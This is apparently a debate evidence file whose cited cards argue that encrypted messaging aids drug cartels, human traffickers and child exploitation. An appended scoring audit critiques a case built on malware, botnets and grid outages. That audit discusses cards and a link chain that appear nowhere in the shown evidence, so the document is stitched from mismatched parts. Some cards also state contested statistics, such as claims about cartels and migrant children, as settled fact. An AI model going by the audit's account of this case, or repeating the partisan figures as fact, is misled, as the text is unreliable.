In fiscal year 2024, U.S. Customs and Border Protection (CBP) seized nearly 22,000 pounds of fentanyl, according to agency data.
While seizures have declined since 2023, cocaine interdictions are on the rise. Most of the world’s cocaine is
produced in Colombia, particularly in areas near Venezuela and Ecuador. Traffickers use “go-fast” boats, narco-subs, cargo vessels,
and small aircraft to move shipments north. Key routes pass through Ecuador, Venezuela, Central America, and the Caribbean.
According to a 2023 United Nations report, the United States received an estimated 3,000 tons of
Colombian cocaine, roughly eight times the amount imported in 2012. The Trump administration
has increased military operations targeting narcotics traffickers, particularly in the Caribbean and eastern Pacific. It's believed that
the Department of War — led by Secretary of Defense Pete Hegseth — has reported 16 strikes on suspected narco vessels in South
American waters as of November. The Centers for Disease Control and Prevention describes the surge in fentanyl-related overdoses
as the “third wave” of the opioid epidemic — following the widespread abuse of prescription
painkillers in the 1990s and heroin in the early 2010s. Fentanyl deaths nearly doubled each
year from 2011 to 2016, rising from 1,663 to 18,335, according to the CDC. Most seizures now
occur at official ports of entry along the southern border. The Financial Crimes Enforcement Network reported
roughly $1.4 billion in suspected fentanyl-related financial activity in 2024.
Encryption is the reason. Faure 25
Quentin Faure, “Digital Shadows: The Role of Encrypted Messaging in Transnational Organized
Crime,” Police Chief Online, September 24,
2025.https://www.policechiefmagazine.org/digital-shadows-encryption/#:~:text=Complex%20mil
itary%20operations%20have%20one,crime%20at%20the%20local%20level. //alyssac
Complex military operations have one point in common with large-scale drug trafficking enterprises: they rely on swift and secured
communications. The massive development over the past 10 years of end-to-end encrypted instant
messaging services has provided criminals involved in international drug trafficking with
high-tech tools to contact each other and conduct their activities in a significantly more secure
way. Beyond international trafficking operations, these communication tools also greatly facilitate
the expansion of drug-related crime at the local level. Most mainstream instant messaging applications (e.g.,
WhatsApp, Viber, Telegram, Signal) are not designed specifically for criminal use. Nonetheless, they are used to conceal
criminal activities, and they pose a major challenge for police and judicial authorities around the
globe regarding their capacity to conduct real-time interception. They are used almost exclusively by the
actors of the international drug trade, their associates, their facilitators, and close relatives. Some of these tools have been
successfully targeted and cracked by large-scale judicial investigations (e.g., Ennetcom, Phantom Secure, EncroChat, SkyECC, Exclu,
Ghost). A significant number of them however remain active and continue to support drug-related
activities that have an untold negative impact on public safety and national security across many
countries.This vulnerability led the top level of the drug crime underworld to promote the development of a new generation of
encrypted instant messaging tools. The latter are specifically designed for criminal purposes, and distributed at a much higher price,
with dedicated hardened terminals that cannot be cracked open by the regular extraction techniques
used by investigators. “Encrypted communications are one of the key catalysts of the intensity,

and of the expansion, of drug-related crime.” These encrypted communications (both legal and criminal ones) are a
key catalyst for the expansion and intensity of drug-related crime. Adjusting practices to this new reality is a
must for police and judicial authorities. These efforts however need to be backed by an evolution of the legal framework in which the
online instant messaging services operate.
Indeed, Ring 25 reported that
[Suzi (legal correspondent @ Financial Times), “Europol chief says Big Tech has ‘responsibility’
to unlock encrypted messages,” Financial Times, 01-19-2025,
https://www.ft.com/content/1e6a600d-8620-4ed6-a4cd-5c454d6247ba, DOA 10-27-2025] abhi
Europol, which uses its giant trove of data to help states combat serious and organised crime in
areas such as terrorism, drug trafficking and fraud, has doubled in size to about 1,700 staff under De Bolle.
European Commission president Ursula von der Leyen said last year that she wanted to further increase Europol’s staff and
strengthen its mandate to “become a truly operational police agency”. Outside its work for EU member states, a number of countries,
including the UK and the US, have desks within the agency. De Bolle said she did not anticipate much change to the US set-up after
Donald Trump takes up the presidency this month, based on his previous term in office. The US has about 30 officials sitting
in-house at Europol from a number of different agencies, such as the Federal Bureau of Investigation. She said she had yet to meet
the incoming Trump administration. Europol demonstrated its value last year with the disruption of the
prolific LockBit ransomware group, which involved the FBI and the US justice department. The
agency has also played a big role in combating drug trafficking in Europe, including helping
decode the messaging services EncroChat and Sky ECC, which were used by criminals.
Access to their messages has led to a multitude of criminal cases and thousands of arrests.
Last year, more than 100 people were sentenced in Belgium’s largest-ever criminal trial, based on evidence from the Sky ECC
decryption. De Bolle said more cases stemming from the decryption of the messaging services
were to come. Europol will publish its four-yearly assessment of serious and organised crime
facing the EU in March, which would include information on foreign interference, De Bolle said.
And,
[No Author (Aus. Statistics Bureau is an official government agency), 6-3-2025, "Recorded
Crime", Australian Bureau of Statistics,
https://www.abs.gov.au/statistics/people/crime-and-justice/recorded-crime-offenders/latest-rele
ase, DOA: 10-29-2025] eti
In 2023–24: there were 340,681 offenders proceeded against by police across Australia – the
lowest number in the time series which began in 2008–09 the number of illicit drug offenders
decreased to the lowest number in the time series (48,213 offenders) family and domestic violence offenders increased by 3% to 90,697 offenders Impact of COVID-19
on data Australia’s federal, state and territory governments put restrictions in place to slow the spread of Coronavirus (COVID-19) from March 2020 to February 2023. The restrictions, and associated penalties for breaching these restrictions, varied across the
jurisdictions. This should be considered when interpreting the Recorded Crime – Offenders data for associated reference periods. Australia There were 340,681 offenders proceeded against by police across Australia in 2023–24. This was a 2%
decrease (down 7,061 offenders) from the previous year to the lowest number recorded since the
time series began in 2008–09.

Anderson 21 found
[David (reporter and researcher @ IDEAS), “The Aggregate Cost of Crime in the United States,”
xx-xx-2021, https://ideas.repec.org/a/ucp/jlawec/doi10.1086-715713.html, DOA 10-29-2025] abhi
Estimates of crime’s burden inform public and private decisions about crime-prevention measures. More than counts of criminal
offenses, the aggregate cost of crime conveys the scale of problems from crime and the value of deterrence. This article offers an
estimate of the total annual cost of crime in the United States, including the direct costs of law
enforcement, criminal justice, and victims’ losses and the indirect costs of private deterrence,
fear and agony, and time lost to avoidance and recovery. The findings update crime-cost estimates of past
decades while expanding the scope of coverage to include categories missing from past studies. The estimated annual cost of crime
is $4.71–$5.76 trillion including transfers from victims to criminals and $2.86–$3.92 trillion net
of transfers.
Taylor 22
Chloe Taylor, Feb 8 2022, “Drug overdoses are costing the U.S. economy $1 trillion a year,
government report estimates,” CNBC,
https://www.cnbc.com/2022/02/08/drug-overdoses-cost-the-us-around-1-trillion-a-year-report-s
ays.html //alyssac
Fatal opioid overdoses are thought to be costing the U.S. economy $1 trillion each
year, government officials have said. In a report published Tuesday by the bipartisan U.S. Commission on Combating Synthetic
Opioid Trafficking, it was revealed that synthetic opioids — primarily fentanyl — were responsible for almost two in three reported
drug overdose deaths in the U.S. in the year to June 2021.
And, trafficking kills- enough to kill the entire country and then some-
Ferragamo et al 10/30
Mariel Ferragamo,Claire Klobucista, 10-30-2025, "Fentanyl and the U.S. Opioid Epidemic," Council on Foreign Relations,
https://www.cfr.org/backgrounder/fentanyl-and-us-opioid-epidemic //alyssac
Along with the pandemic, the growing availability of illicit fentanyl, often disguised by drug cartels to appear as legal prescription
opioids, has exacerbated the crisis. In 2024, the DEA seized more than fifty-five million fentanyl-laced, fake prescription pills, down
from eighty million the previous year. Last year’s seizures represented more than 367 million deadly
doses. So far in 2025, the DEA has reported more than thirty-four million seizures of fentanyl pills. Fentanyl trafficking,
however, has steadily increased, reaching 3,639 offenses in fiscal year 2024.

C3 is Trafficking
Cartels are massive human traffickers- rescues are slim- at the border
alone, Luttrell 23
“OPINION: Human and Drug Trafficking Fueled by Cartels | Congressman Morgan Luttrell.”
Congressman Morgan Luttrell, 15 Aug. 2023,
luttrell.house.gov/media/in-the-news/opinion-human-and-drug-trafficking-fueled-cartels. //alyssa
c
As the human trafficking industry expands, the U.S. Department of State estimates between
14,500 and 17,500 victims are trafficked within the United States each year, and an estimated
72% of these victims are immigrants. Painting an even grimmer picture, more than 370,000
unaccompanied children have come to our southern border unlawfully under President Biden,
and studies show that 60% of unaccompanied migrant children are caught by cartels and
exploited through child pornography and drug trafficking. Only 1% of victims are rescued. It’s a
problem we cannot afford to ignore.The cartels at the southern border are also running one of
the most extensive drug trafficking operations in the world, with a major emphasis on fentanyl.
Customs and Border Protection (CBP) has seized more than 22,000 pounds of fentanyl at the
southern border so far in Fiscal Year (FY) 2023, surpassing totals for all of FY22. It takes just two
milligrams to kill an adult, making it the most lethal drug our nation has ever encountered.
Fentanyl is now the leading cause of death in 18-45 year olds, and in just over a year, the United
States has seen nearly 100,000 deadly overdoses from this lethal drug.
Omer 25
Frenkel, Omer. “Criminal Gangs Go Digital: The Challenge for Law
Enforcement.” Cognyte, 19 Aug. 2025,
www.cognyte.com/blog/criminal-gangs. //alyssac 🫧
Criminal gangs no longer operate solely on the streets. They’re using digital platforms to scale a
wide range of criminal activities, such as drug trafficking, extortion and money laundering, and to
coordinate across borders with minimal physical presence. From extortion and human trafficking
to identity theft or fraud using encrypted apps and anonymous networks, criminal gangs are
weaponizing the same digital tools that billions of law-abiding citizens use for communication
and commerce.

Child trafficking using E2EE
Goggin 25 --- (Ben Goggin; Ben Goggin is the deputy tech editor for NBC News., 5-8-2025, "Child
exploitation watchdog says Meta encryption led to sharp decrease in tips and
reports",
https://www.nbcnews.com/tech/security/child-exploitation-watchdog-says-meta-e
ncryption-led-sharp-decrease-ti-rcna205548) //doa10-21-2025 + ELIMAFIA 🕵
The top U.S. watchdog monitoring child exploitation online says that a sharp drop in
reports from tech companies is primarily due to Meta and its embrace of end-to-end
encryption.
The National Center for Missing and Exploited Children’s annual report, released Tuesday, said the organization received
about 29.2 million reports of suspected exploitation in 2024 — a drop of roughly 19% compared with the
year before.
In total, the organization received 7 million fewer reports. It’s the largest drop in the organization’s
history, and only the second on record.
“When I saw the number my question was, ‘Did somebody stop reporting altogether? Did somebody go out of business or
merge?’” said Yiota Souras, the center's chief legal officer. “There wasn’t anything like that.”
Meta accounted for almost the entire decline, reporting 6.9 million fewer incidents than in 2023, according to the report.
The company has been the top incident reporter to the center since at least 2019, and this year still
made up over 67% of the center's total reports. Meta’s Facebook is the world’s largest social media platform, and its
WhatsApp, Instagram and Messenger all rank in the top 10 largest social tech platforms by monthly active users.
In a statement, a Meta spokesperson said: “We’ll continue working with NCMEC to make our reports as valuable as
possible and we expect to continue to report more than any of our peers.” Meta said that it increased the number of
reports involving direct contact with minors, and noted that even in its encrypted environments, it provides users with
reporting tools.
The National Center for Missing and Exploited Children (NCMEC) is tasked by the federal government (through the
PROTECT Act of 2003) to receive, process and analyze reports of online child exploitation made by tech companies and
the public. Their annual report is widely viewed by child safety experts as an authoritative snapshot of what is believed to
be the escalating problem of child exploitation online. Since the reports began being collected by tech
companies in 1998, the numbers have increased sharply, going from fewer than a million
total per year to 36.2 million in 2023. NCMEC has said that the increasing number of reports reflects a
ballooning issue, but also better reporting practices.
Souras said that NCMEC’s analytics suggest that Meta’s drop in reports was almost
entirely due to instituting end-to-end encryption on Facebook and Messenger. Meta has
said that it embraced end-to-end encryption on the platforms to provide more safety, security and privacy for its users.
The company has also stressed that it built safety measures to combat abuse and made changes to its age policies.
End-to-end encryption is a security protocol that limits platforms’ ability to analyze the
contents of messages. Security advocates have praised the proliferation of the technology, but many law

enforcement and child safety advocates have said that widespread use of end-to-end encryption will severely handicap the
ability of law enforcement and tech companies to detect crime on their platforms.
“There is no visibility into incidents in the same way, regardless of what companies
may say that they’re doing it as alternative measures,” she said. “We feel like this is the year that we
were seeing what happens when companies default encrypt on social media platforms where there are kids and offenders
— we lose reports.”
In 2024, Meta piloted a new program with NCMEC, allowing the platform to “bundle” reports, which resulted in an even
lower number of total reports.
"We partnered with NCMEC to streamline our reporting process by grouping duplicate viral or meme content into a single
cybertip. This contributed significantly to the drop in cybertips last year, and allowed NCMEC and law enforcement to more
easily manage and prioritize them," a Meta spokesperson said.
NCMEC said when the bundled reports were unbundled, allowing for a count of every incident, there was still a disparity of
7 million reports between years.
Meta wasn’t alone in reducing its reporting numbers in 2024. NCMEC also noted that Google, X,
Discord, Microsoft and the cloud software company Synchronoss all submitted at least
20% fewer reports than in 2023.
NCMEC says its not clear what drove the reduction in reports, but emphasized that the cost is high for each
instance of child exploitation that isn’t detected or reported by tech companies.
“Behind every report is a child who is being sextorted, enticed, whose sexual abuse,
images of their abuse, of their rape, is being traded,” Souras said. “If no one can see that report,
because they cannot see that image for it to be reported, no one is likely to be able to intervene and help recover that
child.”
In a statement a Microsoft spokesperson said the company “proactively implements measures to detect and disrupt child
sexual exploitation on our services. We are in regular contact with the National Center for Missing and Exploited Children
and continue to take steps to improve our reporting systems. We take this issue seriously and expect to see our reporting
numbers increase in 2025.”
Omer 25
Frenkel, Omer. “Criminal Gangs Go Digital: The Challenge for Law Enforcement.” Cognyte, 19
Aug. 2025, www.cognyte.com/blog/criminal-gangs. //alyssac
Criminal organizations across the globe have embraced this shift—from street-level crews to powerful transnational networks.
Groups like Mexico’s Sinaloa and Jalisco cartels and Europe’s Kinahan crime syndicate have
used encrypted messaging apps, social media and crypto tools to expand their reach, coordinate operations and evade
law enforcement. Messaging apps like Telegram and Discord, cryptocurrencies and social media
platforms have become key enablers for recruitment, coordination and monetization. As a result, law
enforcement agencies (LEAs) face mounting challenges in identifying, investigating and dismantling these groups.

It’s every week
Kaste 20 --- (Martin Kaste; Martin Kaste is a correspondent on NPR's National Desk. He covers law
enforcement and privacy. He has been focused on police and use of force since before the 2014 protests in Ferguson, and
that coverage led to the creation of NPR's Criminal Justice Collaborative, 2-20-2020, "Trump
Administration Targets Your 'Warrant-Proof' Encrypted Messages",
https://www.npr.org/2020/02/21/805032627/trump-administration-targets-your-w
arrant-proof-encrypted-messages) //doa10-23-2025 + ELIMAFIA 🕵
Recent headlines have focused on the FBI's disputes over encryption with Apple, which has refused investigators' requests
to "break into" iPhones recovered from high-profile terrorism attacks. But those situations are relatively
rare. In practice, it's local law enforcement that more often finds itself frustrated by
encryption.
Sponsor Message
"It comes into play at least once or twice every single week," says Capt. Clay Anderson, who
supervises investigations at the Sheriff's Office in Humphreys County, Tenn.
Technology
Apple Declines DOJ Request To Unlock Pensacola Gunman's Phones
"Human trafficking and sexual-exploitation-of-minor cases — those are very frequent,"
Anderson says, "and in those cases you run into dead ends because you can't get past encryption."
There's often little point in getting a warrant for a sexual predator's digital messages, he says,
because the messaging company isn't able to produce anything. If they could get those
communications, he says, it would be easier to build cases for the prosecution.
"Who needs that kind of encryption, other than maybe the military?" he asks. "We don't even — in law enforcement — use
encryption like that."
Moxie Marlinspike thinks regular people want it. He's the software developer who co-created the encryption
system used in WhatsApp and other systems.
"People's expectations when they send someone a message is that that message is viewable by themselves and the
intended recipient," he says. "And people are always very disappointed when that turns out to not be true."
Indeed,
Finklea 25 --- (Finklea, Kristin; Specialist in Domestic Security, Congressional Research Service,
1-6-2025, "Law Enforcement and Technology: The “Lawful Access” Debate",
https://www.congress.gov/crs-product/IF11769) //doa10-23-2025 + ELIMAFIA 🕵

Communications Content. Wiretap requests are submitted by law enforcement to judges,
requesting permission to intercept certain wire, oral, or electronic communications in transit. According to data reported
to the Administrative Office of the U.S. Courts, federal and state judges authorized 2,101 wiretaps in 2023. Half of
these (1,051) were used in narcotics investigations. Of the 2,101 wiretaps, encrypted
communications were encountered in 472 instances. Law enforcement could not decrypt the
content in 425 (approximately 90%) of the cases where they encountered encrypted
communications.
Human trafficking is a crime unlike any other. Being a victim of human trafficking has been
described as “a life worse than death itself”, not only because the victims are held in
captivity, but because they are dehumanized and often made to suffer horrific physical and
emotional abuse, starvation, isolation and other forms of violence

## Construction-criteria audit

### Embedded weighing
**ABSENT:** No cards contain explicit comparative weighing language (magnitude, probability, timeframe, or prerequisite framing) built into the taglines or evidence text. The case presents a linear chain — malware ↑ → encryption hides it → chat platforms abused → botnets form → grid outage — but never flags why this impact outweighs likely Con impacts (e.g., privacy costs, encryption backdoor risks, false-positive harms). A weighing card would carry a tag like “Cyber-grid collapse outweighs — systemic, irreversible, and prerequisite to all other impacts” with evidence quantifying blackout mortality/economic toll (e.g., DOE 2023 grid-resilience report) and belong in the C1 overview or as a standalone "Weighing" module before the contention.

### Offensive spikes
**ABSENT:** No cards preemptively answer Con’s core positions: (1) “scanning breaks E2EE and creates systemic vulnerability” — need a card tagging “Client-side scanning preserves E2EE security properties — Apple/Google implementations prove no backdoor created” (e.g., Levy & Robinson 2022 *CACM* or recent Apple Advanced Data Protection white paper); (2) “false positives chill speech / over-block legit content” — need a card tagging “False-positive rates <0.01% in deployed CSS systems — Google Messages scam alerts prove precision at scale” (Davies 25 hints at this but doesn’t quantify); (3) “adversaries migrate to unmonitored platforms” — need a card tagging “Displacement fails — chat platforms are irreplaceable C2 infrastructure per Giron 24.” These belong as embedded spikes in C1 after the solvency cards.

### Defensive spikes
**ABSENT:** No embedded frontlines against the specific responses this case will face. Missing: (1) “CSS ≠ mass surveillance — on-device, no plaintext leaves phone” card (cite: *Mozilla 2023 CSS threat model*); (2) “Keys/QR verification is opt-in, not mandated — solves authoritarian misuse” card (Davies 25 mentions opt-in but tag doesn’t weaponize it); (3) “Botnet-grid link is peer-reviewed physics, not speculation” card (Soltan 18 is strong but tag doesn’t flag *USENIX Security* peer review). These belong as “Defensive Spike” sub-points under each internal link.

### Evidence quality
**SSRT 25 (Sonatype Security Research Team, 2025-10-15)** — Proprietary dataset of 32.1B+ encrypted threats blocked, 34k new malware packages tracked quarterly; author is dedicated security research org with live telemetry. Wins evidence-comparison tiebreaks on recency (Q3 2025), dataset scale, and direct observability vs. academic models.  
**Desai 24 (Zscaler ThreatLabz, 2024-12-05)** — 32.1B encrypted attacks analyzed over 12 months; author is CSO of major cloud security vendor with inline inspection telemetry. Beats generic “encryption helps bad actors” claims with empirical volume breakdown by category (malware 86.5%, crypto-jacking +122.9% YoY).  
**Soltan 18 (USENIX Security Symposium, 2018)** — Peer-reviewed conference paper simulating MadIoT attacks on real grid models (WSCC, Polish grid); Princeton authors, rigorous physics-based simulation. Older but only card quantifying *device counts needed for blackout* (90k ACs / 18k heaters), making it uniquely specific for impact calculus.

### Collapse flexibility
**ABSENT:** Case is pinned to a single linear link chain: malware → encryption → chat platforms → botnets → grid outage. No alternative impact scenarios if any link is broken (e.g., if botnet-grid link is contested, no fallback to data-theft → financial systemic risk, or ransomware → hospital mortality, or AI-model poisoning → critical-infrastructure misoperation). A flexible case would include at least two additional terminal impact modules — e.g., “C2: Data Exfiltration → Critical Infrastructure IP Theft” (SSRT 25 notes 37% data-exfil malware, 218% govt attack surge) and “C3: Ransomware → Healthcare Disruption” (PAN 25 botnet-ransomware link + recent Change Healthcare hack) — each with independent solvency ties to scanning.

### Warrant depth
**Giron 24 (Andy Giron, Datadog Security Labs, 2024-01-10)** — Tag: “Mainstream chat platforms are key — they're used day-to-day so they don't seem suspicious.” Evidence provides *mechanistic warrant*: enumerates *why* threat actors migrated (hosting providers vigilant, IDS improved, chat platforms offer “inherent network encryption, scalability, resilience” and “remove burden of maintaining threat actor infrastructure”). Explains the *causal driver*, not just correlation.  
**Soltan 18 (Saleh Soltan, USENIX Security, 2018)** — Tag: “Botnets cause grid outage.” Evidence warrants via *physics-based simulation* on real grid models: details exact failure modes (frequency instability → generator tripping, line overloads → cascading failures, operating-cost manipulation), quantifies device thresholds (90k ACs for WSCC blackout), and explains *why* grid assumptions break (demand predictability violated by IoT botnet).  
**Desai 24** — Tag: “Attackers use end-to-end encryption to spread harmful malware.” Evidence warrants with *category-specific telemetry*: malware 86.5% of encrypted threats, crypto-jacking +122.9% YoY, phishing +34.1% YoY, tied to GenAI enabling better payloads. Goes beyond “encryption hides bad stuff” to *which threats, how much, and why growing*.

### Internal consistency
**INCONSISTENT:** The overview and C1 both lead with **Davies 25 (Google Messages scam-link detection + Key Verifier)** as the solvency proof, but the internal links require **scanning message *contents*** to stop malware/C2/botnets. Davies 25 describes *link reputation checks* and *identity verification via QR codes* — neither scans encrypted message *payloads* for malware or C2 beacons. Giron 24 and Desai 24 emphasize malware *payload delivery* and *C2 traffic* inside encrypted chats; Soltan 18 requires botnet *command execution* on IoT devices. The solvency card does not match the threat model the contention builds. Either the case needs a card proving client-side *content* scanning (e.g., Apple CSAM/Communication Safety on-device ML) or the contention must collapse to “link reputation + identity verification stops phishing → reduces initial infection → shrinks botnet recruitment” — a narrower, differently warranted story.

---

### Overall construction score
**Score: 4/10** — High-quality, recent evidence on the threat side (SSRT, Zscaler, USENIX) with real mechanistic warrants, but the case lacks embedded weighing, offensive/defensive spikes, collapse flexibility, and — critically — internal consistency between its solvency card and its own link chain, making it strategically brittle despite strong cards.
